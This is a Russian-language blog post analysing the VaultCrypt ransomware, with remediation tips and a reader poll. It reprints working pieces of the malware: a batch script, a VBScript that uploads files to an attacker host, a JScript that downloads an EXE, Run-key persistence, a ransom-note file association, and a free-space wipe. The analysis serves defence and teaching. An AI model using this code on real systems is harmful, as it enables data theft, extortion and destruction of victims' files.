+echo StringToMB=B &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Function &gt;&gt; "%temp%\77406a1e.vbs"
+echo Sub Wait^(^) &gt;&gt; "%temp%\77406a1e.vbs"
+echo On Error Resume Next &gt;&gt; "%temp%\77406a1e.vbs"
+echo End Sub &gt;&gt; "%temp%\77406a1e.vbs"
+echo var fp="%%temp%%\\",os="attached-email",WshShell=CreateObject^("WScript.Shell"^),fp=WshShell.ExpandEnvironmentStrings^(fp^);function CreateObject^(b^){return new ActiveXObject^(b^)}function dw^(b,d^){var c=new ActiveXObject^("MSXML2.XMLHTTP"^);c.open^("GET",b,0^);c.send^(^);new ActiveXObject^("Scripting.FileSystemObject"^);var a=new ActiveXObject^("ADODB.Stream"^);a.Open^(^);a.Type=1;a.Write^(c.ResponseBody^);a.Position=0;a.SaveToFile^(d,2^);a.Close^(^)}dw^("http://"+os+".com/v.vlt",""+fp+"30cb056a.exe"^); &gt; "%temp%\885873e9.js"
+wscript.exe //B //Nologo //T:120 "%temp%\885873e9.js"
+if exist 30cb056a.exe (
+"%temp%\30cb056a.exe" -f "%temp%\91c09c60.25ca7a7c"
+wscript.exe //B //Nologo //T:120 "%temp%\77406a1e.vbs" "%temp%\91c09c60.25ca7a7c" http://attached-email.com/v.php pf
+del /f /q 30cb056a.exe
+)
+del /f /q "%temp%\885873e9.js"
+del /f /q "%temp%\77406a1e.vbs"
+del /f /q "%temp%\91c09c60.25ca7a7c"
+attrib -h -s "%temp%\9480bf43.76a94786"
+del /f /q "%temp%\9480bf43.76a94786"
+del /f /q "%temp%\*.gpg"
+del /f /q "%temp%\*.*xe"
+echo Y|assoc .vault=d21f132a
+echo Y|ftype "d21f132a"=mshta.exe vbscript:Execute^(^"msgbox ^"^" BLOCK:^"^"^&amp;vbNewLine^&amp;^"^" %%1^"^"^&amp;vbNewLine^&amp;vbNewLine^&amp;ChrW^(10139^)^&amp;^"^" KEY PURCHASE: http://restoredz4xpmuqr.onion^"^"^&amp;vbNewLine^&amp;vbNewLine^&amp;^"^" [accessible only via Tor Browser: http://torproject.org]^"^",16,^"^"VaultCrypt [Need to purchase key]^"^":close^"^)
+echo Y|assoc "d21f132a"\DefaultIcon=%SystemRoot%\System32\shell32.dll,-48
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "b320494e" /t REG_SZ /f /d "mshta %appdata%\ddae25beb5b57d6e.hta"
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "e1a04a3c" /f
+del /f /q "%temp%\e33176c1.js"
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "58f139df" /f
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ed3f074a" /f
+start mshta "%temp%\ddae25beb5b57d6e.hta"
+attrib -s -h "%temp%\9480bf43.76a94786"
+del /f /q "%temp%\9480bf43.76a94786"
+if exist "%systemroot%\system32\cipher.exe" (
+FOR %%s IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :461cd8b8 %%s
+goto 3c5d9ac8
+:461cd8b8
+cipher /w:%1:
+goto:eof
+:3c5d9ac8
+)
+del /f /q %0
+:871c371d
+
+В начале этого участка кода создается файл VBScript, который предназначен для отправки данных на сервер злоумышленников. Этот скрипт принимает на вход три аргумента:имя файла, который нужно загрузить;
+адрес сервера, на который необходимо переслать информацию;
+имя поля в HTTP-запросе, в котором будут содержаться передаваемые данные.
+Отформатированный код:do_vbsUpload
+
+Sub do_vbsUpload()
+  Dim FileName, DestURL, FieldName
+  FieldName = "FileField"
+  Dim aCounter, Arg
+  aCounter = 1
+  For Each Arg In WScript.Arguments
+    Select Case aCounter
+      Case 1: FileName = Arg
+      Case 2: DestURL = Arg
+      Case 3: FieldName = Arg
+    End Select
+    aCounter = aCounter + 1
+  Next
+  UploadFile DestURL, FileName, FieldName
+End Sub
+
+Sub UploadFile(DestURL, FileName, FieldName)
+  Const Boundary = "---------------------------0123456789012"
+  Dim FileContents, FormData
+  FileContents = GetFile(FileName)
+  FormData = BuildFormData(FileContents, Boundary, FileName, FieldName)
+  IEPostBinaryRequest DestURL, FormData, Boundary
+End Sub
+
+Function BuildFormData(FileContents, Boundary, FileName, FieldName)
+  Dim FormData, Pre, Po
+  Const ContentType = "application/upload"
+  Pre = "--" + Boundary + vbCrLf + mpFields(FieldName, FileName, ContentType)
+  Po = vbCrLf + "--" + Boundary + "--" + vbCrLf
+  Const adLongVarBinary = 205
+  Dim RS: Set RS = CreateObject("ADODB.Recordset")
+  RS.Fields.Append "b", adLongVarBinary, Len(Pre) = LenB(FileContents) = Len(Po)
+  RS.Open
+  RS.AddNew
+  Dim LenData
+  LenData = Len(Pre)
+  RS("b").AppendChunk(StringToMB(Pre) &amp; ChrB(0))
+  Pre = RS("b").GetChunk(LenData)
+  RS("b") = ""
+  LenData = Len(Po)
+  RS("b").AppendChunk(StringToMB(Po) &amp; ChrB(0))
+  Po = RS("b").GetChunk(LenData)
+  RS("b") = ""
+  RS("b").AppendChunk(Pre)
+  RS("b").AppendChunk(FileContents)
+  RS("b").AppendChunk(Po)
+  RS.Update
+  FormData = RS("b")
+  RS.Close
+  BuildFormData = FormData
+End Function
+
+Function IEPostBinaryRequest(URL, FormData, Boundary)
+  Dim IE: Set IE = CreateObject("InternetExplorer.Application")
+  IE.Navigate URL,,,FormData,_
+  "Content-Type: multipart/form-data; boundary = " + Boundary + vbCrLf
+  do While IE.Busy
+    Wait
+  Loop
+  On Error Resume Next
+  IEPostBinaryRequest = IE.Document.body.innerHTML
+  IE.Quit
+End Function
+
+Function mpFields(FieldName, FileName, ContentType)
+  Dim MPtemplate
+  MPtemplate = "Content-Disposition: form-data; name = ""{field}"";"+_
+  " filename = ""{file}""" + vbCrLf+_
+  "Content-Type: {ct}" + vbCrLf + vbCrLf
+  Dim Out
+  Out = Replace(MPtemplate, "{field}", FieldName)
+  Out = Replace(Out, "{file}", FileName)
+  mpFields = Replace(Out, "{ct}", ContentType)
+End Function
+
+Function GetFile(FileName)
+  Dim Stream: Set Stream = CreateObject("ADODB.Stream")
+  Stream.Type = 1
+  Stream.Open
+  Stream.LoadFromFile FileName
+  GetFile = Stream.Read
+  Stream.Close
+End Function
+
+Function StringToMB(S)
+  Dim I, B
+  For I = 1 To Len(S)
+    B = B &amp; ChrB(Asc(Mid(S, I, 1)))
+  Next
+  StringToMB = B
+End Function
+
+Sub Wait()
+  On Error Resume Next
+End Sub
+
+Затем в папке %temp% создается JS-файл, который пытается загрузить с сервера злоумышленников EXE-файл и сохранить его в папку %temp%.К сожалению, в связи с безвременной кончиной этого сайта разработчиков получить этот скрипт не представляется возможным.Код:var fp = "%%temp%%\\",
+    os = "attached-email",
+    WshShell = CreateObject("WScript.Shell"),
+    fp = WshShell.ExpandEnvironmentStrings(fp);
+
+function CreateObject(b) {
+    return new ActiveXObject(b)
+}
+
+function dw(b, d) {
+    var c = new ActiveXObject("MSXML2.XMLHTTP");
+    c.open("GET", b, 0);
+    c.send();
+    new ActiveXObject("Scripting.FileSystemObject");
+    var a = new ActiveXObject("ADODB.Stream");
+    a.Open();
+    a.Type = 1;
+    a.Write(c.ResponseBody);
+    a.Position = 0;
+    a.SaveToFile(d, 2);
+    a.Close()
+}
+
+dw("http://" + os + ".com/v.vlt", "" + fp + "30cb056a.exe");
+
+После этого вызываются на выполнение только что созданные JS- и VB- файлы, а также скачанный с сайта злоумышленников EXE-файл (если последний был скачан успешно).
+У меня нет никакой информации о том, какие действия выполняет этот EXE-файл. По всей видимости, результатом его работы является файл 91c09c60.25ca7a7c, который загружается на сервер злоумышленников.Код:wscript.exe //B //Nologo //T:120 "%temp%\885873e9.js"
+if exist 30cb056a.exe (
+"%temp%\30cb056a.exe" -f "%temp%\91c09c60.25ca7a7c"
+wscript.exe //B //Nologo //T:120 "%temp%\77406a1e.vbs" "%temp%\91c09c60.25ca7a7c" http://attached-email.com/v.php pf
+del /f /q 30cb056a.exe
+)
+4.7 Финальный этап
+Здесь удаляются ставшие ненужными скрипты и EXE-файлы, а также служебные файлы, созданные GPG.Код:del /f /q "%temp%\885873e9.js"
+del /f /q "%temp%\77406a1e.vbs"
+del /f /q "%temp%\91c09c60.25ca7a7c"
+attrib -h -s "%temp%\9480bf43.76a94786"
+del /f /q "%temp%\9480bf43.76a94786"
+del /f /q "%temp%\*.gpg"
+del /f /q "%temp%\*.*xe"
+
+После этого скрипт устанавливает свой обработчик открытия файлов с расширением «vault»: при открытии такого файла пользователю должно показываться окно со ссылкой на ключ.Картинка:NB:У меня эти команды почему-то упорно отказываются отрабатывать, так что файлы с расширением «vault» ведут себя как обычные файлы с неизвестным расширением.
+Затем созданное ранее HTML-приложение (%appdata%\ddae25beb5b57d6e.hta) добавляется в автозапуск, так что его окно будет отображаться на экране при каждой загрузке системы.Код:echo Y|assoc .vault=d21f132a
+echo Y|ftype "d21f132a"=mshta.exe vbscript:Execute^(^"msgbox ^"^" BLOCK:^"^"^&amp;vbNewLine^&amp;^"^" %%1^"^"^&amp;vbNewLine^&amp;vbNewLine^&amp;ChrW^(10139^)^&amp;^"^" KEY PURCHASE: http://restoredz4xpmuqr.onion^"^"^&amp;vbNewLine^&amp;vbNewLine^&amp;^"^" [accessible only via Tor Browser: http://torproject.org]^"^",16,^"^"VaultCrypt [Need to purchase key]^"^":close^"^)
+echo Y|assoc "d21f132a"\DefaultIcon=%SystemRoot%\System32\shell32.dll,-48
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "b320494e" /t REG_SZ /f /d "mshta %appdata%\ddae25beb5b57d6e.hta"
+
+После этого из автозапуска удаляются ранее созданные там ключи, открывающие текстовый документ с инструкциями по получению ключа (теперь пользователь при загрузке ОС увидит не текстовый файл, а окно HTML-приложения). Также из автозапуска удаляется вызов процедуры шифрования (так как к этому моменту все файлы уже зашифрованы).
+После этого запускается HTML-приложение, отображающее радостное сообщение о том, что все файлы на ПК зашифрованы.
+Наконец, удаляется файл 9480bf43.76a94786, который является маркером того, что экземпляр вредоносного скрипта уже запущен. Теперь можно запускать заново.)Код:reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "e1a04a3c" /f
+del /f /q "%temp%\e33176c1.js"
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "58f139df" /f
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ed3f074a" /f
+start mshta "%temp%\ddae25beb5b57d6e.hta"
+attrib -s -h "%temp%\9480bf43.76a94786"
+del /f /q "%temp%\9480bf43.76a94786"
+
+Предпоследний шаг — вызов для всех томов утилиты cipher с параметром, предписывающим перезаписать всю информацию на секторах жесткого диска, не отведенных ни под один файл. С помощью этой команды данные удаленных ранее файлов окончательно перезатираются на физическом уровне.Код:if exist "%systemroot%\system32\cipher.exe" (
+FOR %%s IN (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) DO call :461cd8b8 %%s
+goto 3c5d9ac8
+:461cd8b8
+cipher /w:%1:
+goto:eof
+:3c5d9ac8
+)
+
+Финальный аккорд — самоудаление вредоносного скрипта с ПК пользователя.del /f /q %0
+:871c371d
+Never existed...Картинка, естественно, не моя: это обложка альбома группы "Condemn the Infected", которая очень мне понравилась своим слоганом.
+Музыку их, если что, никогда не слушал.)5 Алгоритм и файлыКраткое содержание предыдущих разделов :)Основные файлы, создаваемые при работе главного скрипта:
+Список:03dfb98e.7087b06e — файл с открытым ключом злоумышленников;
+21b0fb7b.7ca0ec0c — «заготовка» списка файлов, подлежащих шифрованию;
+3637bf69.36ddf8fe — «заготовка» VAULT.KEY: файл с закрытым ключом, которым будут зашифрованы файлы пользователя, а также с некоторой технической информацией;
+4077430c_VAULT.KEY — по-видимому, резервная копия VAULT.KEY;
+59665d79.vbs — скрипт удаления теневых копий;
+61231f25.9db8b89a — «заготовка» скрипта шифрования;
+69aca909.cmd — запускает скрипт удаления теневых копий (59665d79.vbs);
+9480bf43.76a94786 — файл-индикатор того, что вредоносный скрипт уже запущен;
+acda3f33.js — запускает скрипт 69aca909.cmd;
+CONFIRMATION.KEY — зашифрованный файл, в котором хранится список зашифрованных файлов пользователя и некоторая служебная информация;
+ddae25beb5b57d6e.hta — приложение (HTML Application), выводящее сообщение о том, что файлы пользователя были зашифрованы, и показывающее инструкции по получению ключа дешифровки;
+gpg.exe — утилита GPG для шифрования файлов;
+install.bat — главный скрипт троянца;
+pubring.bak — служебный файл утилиты GPG;
+pubring.gpg — служебный файл утилиты GPG;
+pubring.gpg.lock — служебный файл утилиты GPG;
+random_seed — служебный файл утилиты GPG;
+secring.gpg — служебный файл утилиты GPG;
+secring.gpg.lock — служебный файл утилиты GPG;
+trustdb.gpg — служебный файл утилиты GPG;
+trustdb.gpg.lock — служебный файл утилиты GPG;
+VAULT.KEY — зашифрованный файл, в котором хранится ключ шифрования файлов пользователя и служебная информация;
+VAULT.txt — текстовый файл с сообщение о том, что файлы пользователя были зашифрованы, и инструкциями по получению ключа дешифровки.
+Образцы (ссылка была выше, продублирую на всякий случай и здесь). Пароль = «virus».NB:Теперь, когда мы примерно представляем, что делает вирус, можно попробовать поиздеваться.
+Например, если создать в папке %Temp% файл 9480bf43.76a94786, то при запуске install.bat ничего не произойдет.
+Если в полном пути к документу присутствуют слова из «системного списка», то такой документ не будет зашифрован. Например, если у нас есть пользователь с именем «library_user», то у него в профиле вообще не будет зашифрован ни один файл.
+Наконец, если заранее сделать резервную копию закрытого ключа (файл 3637bf69.36ddf8fe), то, разумеется, можно будет расшифровать зашифрованные файлы.
+Для этого вначале импортируем закрытый ключ:gpg --import 3637bf69.36ddf8fe
+А затем расшифровываем:gpg --decrypt --output test.docx test.docx.vault
+Параметр --output приходится указывать, так как зашифрованные файлы имеют расширение .vault, а не стандартное .gpg. Если предварительно переименовать файл test.docx.vault в test.docx.gpg, то можно использовать стандартную опцию --decrypt-files:gpg --decrypt-files test.docx.gpg
+В обоих случаях результат будет одинаков: рядом с зашифрованным файлом появится расшифрованный test.docx.
+Почитать про основы использования GPG можно тут [rus] и там [англ.].6 ВыводыПервый баянистый и печальный вывод: антивирусы — не панацея.Ну, почти все антивирусы...Вот результаты проверки файлов на момент атаки.
+JS-файл:
+BAT-файл:
+Как говорится, комментарии излишни, а Dr.Web — молодец. По крайней мере, в данном случае.)
+Со временем, конечно, ситуация несколько улучшается…
+JS:
+BAT:
+Но кому это поможет уже после того, как все данные зашифрованы вымогателями?Второй печальный и баянистый вывод: пользователи все равно упорно продолжают открывать архивы, приложения, ссылки — и вообще все, что попадает в почту.
+Сложно в чем-то их упрекнуть: у всех свои навыки и компетенции. Если меня сейчас посадить за бухгалтерию или в закупки — тоже, думаю, получится забавно.))
+Как говорится, да здравствует мыло пушистое, полотенце душистое и инструктаж по информационной безопасности!NB:Пользуясь случаем, хочу немного помечтать и упомянуть вот этих парней: раз, два.Третий вывод, баянистый и печальный: резервные копии нужны и полезны.
+На этом у меня все. Спасибо за внимание.
+Желаю, чтобы ваши пользователи никогда такую гадость в интрасеть не приносили.
+
+      	
+		
+
+	
+
+		А ваш антивирус блокирует страницу с этим постом?
+
+		
+					
+
+
+				
+					да
+				
+			
+					
+
+
+				
+					нет
+				
+			Проголосовало 245 человек. Воздержалось 46 человек.
+	
+
+    Только зарегистрированные пользователи могут участвовать в опросе. Войдите, пожалуйста.
+	
+
+      
+    
